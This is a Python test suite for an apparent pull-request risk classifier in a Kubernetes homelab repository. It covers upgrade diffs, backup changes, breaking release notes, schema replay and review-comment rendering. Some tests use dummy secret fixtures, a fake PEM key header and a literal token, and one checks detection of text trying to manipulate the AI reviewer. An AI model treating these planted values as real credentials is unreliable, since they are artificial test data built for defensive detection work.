        r = Scenario(mkdiff("kubernetes/talos/version.yaml", "-talos: v1.11.0\n+talos: v1.11.1")).run()
        self.verdict(r, "review", rule="R3")
        self.assertIn("ev.unrendered_surface", codes(r))

    def test_node_upgrade_through_tuppr_f3aa1ab(self):
        """One changed line in a TalosUpgrade renders cleanly and upgrades every node."""
        diff = mkdiff("kubernetes/apps/system-upgrade/tuppr/upgrade/talosupgrade.yaml", "  talos:\n-    version: v1.13.10\n+    version: v1.14.0", header="spec:")
        r = Scenario(diff, title="feat(talos): upgrade cluster to Talos v1.14.0").run()
        self.verdict(r, "review", rule="R3")
        self.assertIn("ev.unrendered_surface", codes(r))

    def test_backup_object_additions_bf62c46(self):
        """Adding a region to CNPG's ObjectStore stopped backups; additions to a backup object count."""
        path = "kubernetes/apps/database/cloudnative-pg/cluster/app/objectstore.yaml"
        diff = mkdiff(path, "    s3Credentials:\n+      region: us-west-001\n      accessKeyId:", header="spec:")
        r = Scenario(diff, config={path: "apiVersion: barmancloud.cnpg.io/v1\nkind: ObjectStore\nspec: {}\n"}).run()
        self.verdict(r, "review")
        self.assertIn("data.recovery_path_changed", codes(r))

    def test_yaml_in_docs_is_an_example(self):
        """e45cdf0: `name: cluster-admin` under `roleRef:` in docs/ROADMAP.md is not a grant; a
        PEM header with no key after it is not a key."""
        doc = mkdiff("docs/ROADMAP.md", "+roleRef:\n+  name: cluster-admin\n+-----BEGIN RSA PRIVATE KEY-----\n+...")
        self.verdict(Scenario(doc).run(), "safe")
        key = mkdiff("docs/ROADMAP.md", "+-----BEGIN RSA PRIVATE KEY-----\n+" + "A" * 64)
        self.verdict(Scenario(key).run(), "risky")

    def test_secret_templates_are_references(self):
        tpl = mkdiff("bootstrap/resources.yaml.j2", "+apiVersion: v1\n+kind: Secret\n+stringData:\n+  token: op://homelab/x/token\n+  other: \"{{ ENV.X }}\"", status="A")
        self.assertNotIn("sec.secret_material_in_git", codes(Scenario(tpl).run()))
        lit = mkdiff("kubernetes/apps/default/whoami/app/secret.yaml", "+apiVersion: v1\n+kind: Secret\n+stringData:\n+  token: hunter2hunter2", status="A")
        self.assertIn("sec.secret_material_in_git", codes(Scenario(lit).run(), {"probable"}))

    def test_description_mismatch(self):
        r = Scenario(DIGEST_BUMP).run(Jev({"description_matches": 0.2}))
        self.verdict(r, "review")
        self.assertIn("intent.unexplained_change", codes(r))

    def test_breaking_change_elsewhere_with_generated_config_197(self):
        """#197 with its generated config in view: notes that break a Prowlarr alias this repo's
        config.yml doesn't use are "elsewhere", still review but with a clear reason."""
        path = "kubernetes/apps/downloads/configarr/app/helmrelease.yaml"
        diff = mkdiff(path, "          image:\n-            tag: 1.32.0\n+            tag: 1.33.0", header="spec:")
        notes = {"source": "renovate", "sections": [{"version": "1.33.0", "text": "### 1.33.0\n\n- prowlarr: drop deprecated app_profile alias (soft-breaking)"}],
                 "reason": "r"}  # fmt: skip
        config = {path: "values: {}\n", "kubernetes/apps/downloads/configarr/app/resources/config.yml": "sonarr:\n  main: {}\nradarr:\n  main: {}\n"}
        jev = Jev({"breaking_notes": 0.79, "breaking_affects_config": 0.10})
        r = Scenario(diff, author="renovate", notes=notes, config=config).run(jev)
        self.verdict(r, "review", rule="R3")
        self.assertEqual(codes(r) - {"ev.release_notes_missing"}, {"compat.breaking_change_elsewhere"})
        self.assertIn("resources/config.yml", jev.states["raw"]["config"])

    def test_breaking_notes_that_touch_config_are_risky(self):
        notes = {"source": "renovate", "sections": [{"version": "v0.9.0", "text": "### v0.9.0\n\n- BREAKING: `foo.bar` was renamed"}], "reason": "r"}
        r = Scenario(DIGEST_BUMP, title="feat(container)!: update foo (v0.8.2 ➔ v0.9.0)", author="renovate", notes=notes,
                     config={APP_HR: "foo:\n  bar: 1\n"}).run(Jev({"breaking_notes": 0.9, "breaking_affects_config": 0.85}))  # fmt: skip
        self.verdict(r, "risky")
        self.assertIn("compat.breaking_change_applies", codes(r, {"probable"}))
        # Unclear applicability: review, and uncertain only when Jev is on the fence.
        r = Scenario(DIGEST_BUMP, author="renovate", notes=notes, config={APP_HR: "x"}).run(Jev({"breaking_notes": 0.9, "breaking_affects_config": 0.5}))
        self.verdict(r, "review", uncertain=True)


# ── Registry, schema, replay ─────────────────────────────────────────────────────────────────


class TestRegistryAndSchema(unittest.TestCase):
    def test_every_declared_code_exists(self):
        for r in rules.RULES:
            for c in r.codes:
                self.assertTrue(c in taxonomy.CODES or c in taxonomy.CONTEXT_CODES, (r.name, c))
        for q in semantic.QUESTIONS.values():
            self.assertIn(q.code, taxonomy.CODES, q.name)

    def test_no_context_code_is_a_finding(self):
        self.assertFalse(set(taxonomy.CODES) & set(taxonomy.CONTEXT_CODES))
        self.assertTrue(all(c.startswith("ctx.") for c in taxonomy.CONTEXT_CODES))

    def test_undeclared_code_is_refused(self):
        a = taxonomy.Assessment([])
        with self.assertRaises(AssertionError):
            rules.Scoped(a, ("ctx.base_overlap",)).find("integrity.merge_conflict", "established", None, (), "x")

    def test_result_schema_and_replay(self):
        s = Scenario(DIGEST_BUMP, konflate=konflate_fresh(warnings=[{"level": "caution", "rule": "replicas-zero", "resource": "Deployment default/whoami"}]))
        keep = Path(tempfile.mkdtemp())
        shutil.copytree(s.dir, keep, dirs_exist_ok=True)
        r = s.run()
        for k in ("schema", "status", "classification", "uncertain", "rule", "dimensions", "surfaces", "findings", "evidence", "context"):
            self.assertIn(k, r)
        self.assertEqual(r["schema"], "pr-risk/v2")
        self.assertEqual(set(r["dimensions"]), {"reach", "stakes", "activation", "reversibility"})
        for f in r["findings"]:
            self.assertEqual(set(f), {"id", "code", "kind", "certainty", "consequence", "surface", "evidence", "description"})
            self.assertTrue(all(e.startswith("e-") for e in f["evidence"]))
        json.dumps(r)
        # Replay: the recorded answers, offline, give the same verdict.
        fixture = {n: {"answers": ans, "model": r["jev"]["model"]} for n, ans in r["jev"]["answers"].items()}
        again = p.classify(keep, key=None, model="jev-test", fixture=fixture)
        shutil.rmtree(keep)
        self.assertEqual((again["classification"], again["uncertain"], again["rule"]), (r["classification"], r["uncertain"], r["rule"]))

    def test_v1_answers_replay_under_v2_names(self):
        fx = load("jev_179.json")
        fx["raw"]["answers"]["addressed_to_reviewer"]["noul"] = 0.95
        d = Path(tempfile.mkdtemp())
        shutil.copytree(FIX / "bundle_179", d, dirs_exist_ok=True)
        try:
            r = p.classify(d, key=None, model="jev-1.13.0", fixture=fx)
        finally:
            shutil.rmtree(d)
        self.assertIn("ev.manipulation_attempt", codes(r))

    def test_comment_shows_what_jev_was_asked(self):
        notes = {"source": "github", "reason": "GitHub releases of foo/helm",
                 "sections": [{"version": "foo-1.1.0", "text": "### foo-1.1.0\n\nThanks @someone, see ```yaml\nx: 1\n```"}]}  # fmt: skip
        requests = {}
        s = Scenario(DIGEST_BUMP, author="renovate", notes=notes)
        try:
            r = p.classify(s.dir, key="k", model="jev-test", answer=Jev(), requests=requests)
        finally:
            shutil.rmtree(s.dir)
        self.assertIn("@someone", requests["raw"]["state"]["release_notes"])
        self.assertEqual(sorted(requests["raw"]), ["model", "questions", "state"])
        md = p.render_comment({**r, "run_url": "https://github.com/o/r/actions/runs/1"})
        self.assertIn("Release notes: github, foo-1.1.0 (GitHub releases of foo/helm)", md)
        self.assertIn("| raw | `breaking_notes` | `release_notes` describe a breaking change", md)
        self.assertRegex(md, r"Jev `raw` input, in characters: .*`release_notes` \d+")
        self.assertIn("````text\n### foo-1.1.0", md)  # fenced past the notes' own ``` so @someone isn't pinged
        self.assertIn("`jev_request.json` in the `pr-risk-999` artifact of [this run](https://github.com/o/r/actions/runs/1)", md)
        # without notes a Renovate PR isn't asked: its description is only the update table (#202)
        none = {"source": "none", "sections": [], "reason": "nothing found"}
        r = Scenario(DIGEST_BUMP, author="renovate", notes=none).run()
        self.assertNotIn("breaking_notes", r["jev"]["asked"]["raw"])
        self.assertNotIn("breaking_notes", r["jev"]["answers"]["raw"])
        md = p.render_comment(r)
        self.assertIn("Release notes: none (nothing found)", md)
        self.assertNotIn("Release notes as sent to Jev", md)
        # a repo-shaped package nobody looked up: the comment says what to do, and it stays context
        r = Scenario(DIGEST_BUMP, author="renovate", notes={**none, "unlisted": ["foo/bar"]}).run()
        self.assertIn("- `ctx.release_notes_unlisted`: No release notes were looked up for `foo/bar`", p.render_comment(r))
        self.assertNotIn("ctx.release_notes_unlisted", codes(r))
        # a call that failed sent nothing the comment should show as sent
        s = Scenario(DIGEST_BUMP, author="renovate", notes=notes)
        requests = {}
        try:
            r = p.classify(s.dir, key=None, model="jev-test", requests=requests)
        finally:
            shutil.rmtree(s.dir)
        md = p.render_comment(r)
        self.assertEqual((r["jev"]["sent"], r["release_notes"]["sent"]), ({}, ""))
        self.assertNotIn("as sent to Jev", md)
        self.assertNotIn("jev_request.json", md)
        self.assertEqual(requests["raw"]["error"], "TYPESAFE_API_KEY not set")
        # a human's description can say something, so there the question is about it
        md = p.render_comment(Scenario(DIGEST_BUMP).run())
        self.assertIn("| raw | `breaking_notes` | `description` mentions a breaking change", md)

    def test_comment(self):
        r = Scenario(DIGEST_BUMP, konflate=konflate_fresh(warnings=[{"level": "caution", "rule": "replicas-zero", "resource": "Deployment default/whoami"}])).run()
        md = p.render_comment(r)
        self.assertTrue(md.startswith(p.COMMENT_MARKER))
        self.assertIn("PR risk: **review**", md)
        self.assertIn("| `default/whoami` | `avail.capacity_reduced` | established | availability loss |", md)
        self.assertIn("**Context:** reach **app**", md)
        self.assertIn("jev-test", md)
        r = Scenario(DIGEST_BUMP, konflate={"state": "stale", "summary": {"reason": "rendering"}}).run()
        md = p.render_comment(r)
        self.assertIn("⚠️ uncertain", md)
        self.assertIn("**Missing evidence**", md)
        self.assertIn("`ev.render_missing` (insufficient)", md)

    def test_diff_parser_keys(self):
        (h,) = rules.parse_diff(mkdiff("x/ks.yaml", """\
  dependsOn:
-    - name: rook-ceph-cluster
      namespace: rook-ceph
  postBuild:
    substitute:
+      APP: foo
""", header="spec:"))["x/ks.yaml"]  # fmt: skip
        minus = next(ln for ln in h.lines if ln.sign == "-")
        plus = next(ln for ln in h.lines if ln.sign == "+")
        self.assertEqual((minus.keys, minus.key, minus.value), (("spec", "dependsOn"), "name", "rook-ceph-cluster"))
        self.assertEqual((plus.keys, plus.key), (("spec", "postBuild", "substitute"), "APP"))

    def test_component_helpers(self):
        self.assertEqual(p.required_vars("${APP} ${X:=1} ${Y:=${APP}} $${ESCAPED} ${Z}"), {"APP", "Z"})
        (doc,) = p.ks_documents((HERE.parent.parent.parent.parent / "kubernetes/apps/default/paperless/ks.yaml").read_text())
        self.assertEqual(doc["name"], "paperless")
        self.assertEqual(doc["path"], "./kubernetes/apps/default/paperless/app")
        self.assertIn("../../../../components/postgres", doc["components"])
        self.assertEqual(doc["substitute"], {"APP", "POSTGRES_BACKUP_SCHEDULE"})
        self.assertFalse(doc["own_sources"])


if __name__ == "__main__":
    unittest.main()
